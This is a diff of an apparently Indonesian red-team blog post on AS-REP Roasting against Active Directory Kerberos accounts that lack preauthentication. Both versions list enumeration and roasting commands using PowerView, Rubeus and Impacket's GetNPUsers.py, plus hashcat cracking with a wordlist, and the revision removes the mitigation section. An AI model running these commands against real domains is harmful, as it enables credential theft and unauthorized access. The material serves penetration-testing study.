@@ -1,81 +1,59 @@
 ---
-title: Part 3 - AS-REP Roasting
+title: '[Kerberos] AS-REP Roasting'
 date: 2022-02-05 08:39:22 +0800
-categories: [Active Directory, Initial Attack Vector]
-tags: [active directory, windows, rubeus, impacket, hashcat, enumeration, exploit]     # TAG names should always be lowercase
+categories: [Active Directory, Post Compromise Attack]
+tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos, impacket, rubeus]     # TAG names should always be lowercase
 author: nairpaa
 ---
 
-### Tujuan 
-
-- *Get a foothold user*
-
-### Prasyarat
-
-- Memiliki list user domain (untuk eksternal eksploit)
-- Terdapat user yang tidak menggunakan *preauthentication*
-
-
-### Tools
-
-- Impacket
-- Rubeus
-- Hashcat
-
----
-
-## Apa itu AS-REP Roasting?
-
-**AS-REP Roasting** adalah serangan terhadap kerberos untuk akun pengguna yang tidak memerlukan *preauthentication*. *Preauthentication* adalah langkah pertama dalam otentikasi Kerberos, dan dirancang untuk mencegah serangan *password guessing*.
-
-Selama *preauthentication*, pengguna akan memasukkan password mereka yang akan digunakan untuk mengenkripsi *timestamp* dan mencoba mendeskripsi dan memvalidasi bahwa password yang benar telah digunakan. 
-
-Selanjutnya, TGT akan dibuatkan untuk pengguna melakukan otentikasi di masa mendatang. Jika *preauthentication* dinonaktifkan, penyerang dapat meminta data otentikasi untuk pengguna mana pun dan DC akan memberikan TGT terenkripsi yang dapat diderkipsi secara offline.
-
-Untungnya, *preauthentication* diperlukan secara default di Active Directory. Namun, konfigurasi ini dapat diubah di pengaturan kontrol akun pengguna di setiap akun, seperti berikut:
+**ASREP Roasting** adalah teknik lain yang bisa digunakan untuk mengeksploitasi cara Kerberos bekerja. Teknik ini bisa digunakan kepada pengguna yang tidak mengaktifkan Kerberos *pre-authentication*.
 
 ![AS-REP Roasting](https://stealthbits.com/wp-content/uploads/2019/06/ASREP-1.png)
 
+*Pre-authentication* adalah metode yang digunakan oleh Kerberos untuk mengonfirmasi identitas pengguna sebelum mengeluarkan *Ticket Granting Ticket* (TGT). 
 
+Jika *pre-authentication* dinonaktifkan, ini berarti bahwa siapa pun dapat meminta *Authentication Service Response* (AS-REP) untuk pengguna tersebut, dan tiket tersebut di-*crack* secara offline untuk mendapatkan password *plaintext*-nya.
 
-## Tahap Eksploitasi
+## 0x1 - Exploitation Stages
 
-### Internal
+### Step 1: ASREPRoastable Enumeration
+
+Seperti halnya [kerberoasting](/posts/kerberoasting), kita tidak ingin melakukan *asreproast* pada setiap akun di domain.
 
 ```powershell
-# enumerasi ASREPRoastable user
-PS> . .\PowerView.ps1
-PS> Get-NetUser -PreauthNotRequired
-
-# dapatkan tgt ticket
-PS> Rubeus.exe asreproast
-
-# export ticket hashcat format
-PS> Rubeus.exe asreproast /format:hashcat /outfile:C:Temphashes.txt	
-
-# ekstrak ticket dengan hashcat
-PS> hashcat64.exe -m 18200 c:/pass-hash.txt example-dict.txt
+# Enumerasi ASREPRoastable menggunakan PowerView
+PS > . .\PowerView.ps1
+PS > Get-NetUser -PreauthNotRequired
 ```
 
+### Step 2: ASREP Roasting
 
-### Eksternal
+#### A. Impacket
 
 ```bash
-# enumerasi dan dapatkan export ticket
+# Remote, hanya membutuhkan username (tanpa password)
 ➜ GetNPUsers.py <domain>/ -usersfile <users.txt> -format <hashcat|john> -outputfile <output.txt> -no-pass -dc-ip
+```
 
-#  ekstrak ticket dengan hashcat
+#### B. Rubeus
+
+```powershell
+PS > Rubeus.exe asreproast /user:squid_svc /nowrap
+```
+
+## 0x2 - Crack the Ticket
+
+```bash
 ➜ hashcat -m 18200 pass.hash /usr/share/wordlists/rockyou.txt
 ```
 
-## Mitigasi
+---
 
-- Identifikasi akun yang tidak memerlukan *preauthentication*
-- Implementasikan password yang kuat
-- Pastikan juga hak akses setiap pengguna sudah sesuai dengan kebijakan yang ada.
-- Monitoring perubahan hak akses pengguna
+## 0x3 - References
 
-## Referensi
+- https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/
+- https://akimbocore.com/article/asrep-roasting/
 
-- [Cracking Active Directory Password with AS-REP Roasting](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/)
-- [AS-REP Roasting by akimbocore](https://akimbocore.com/article/asrep-roasting/)
+
+
+
